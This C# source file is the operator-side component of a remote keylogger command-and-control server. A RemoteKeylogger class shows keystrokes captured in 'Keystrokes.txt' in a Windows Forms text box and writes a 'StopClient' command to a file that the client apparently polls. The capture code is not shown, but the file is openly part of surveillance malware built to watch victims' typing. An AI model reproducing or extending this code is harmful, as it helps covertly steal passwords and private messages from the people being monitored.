using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CommandControlServer
{
    internal class RemoteKeylogger
    {
        public static TextBox tb4 = null;
        public static Button btn9 = null;
        public static Button btn10 = null;

        public static void initRemoteKeylogger(TextBox tb4In, Button btn9In, Button btn10In)
        {
            if (File.Exists("DoCommands.txt")) File.Delete("DoCommands.txt");
            tb4 = tb4In;
            btn9 = btn9In;
            btn10 = btn10In;
        }


        //-- Get Keystrokes
        public static void btn9_click()
        {
            bool bFileExists = File.Exists("Keystrokes.txt");
            if (bFileExists)
            {
                string logContents = File.ReadAllText("Keystrokes.txt");
                tb4.Text = logContents;
            }
        }

        //-- Stop Client
        public static void btn10_click()
        {
            using (StreamWriter sw = File.CreateText("DoCommands.txt"))
            {
                sw.WriteLine("StopClient");
            }
        }
    }
}
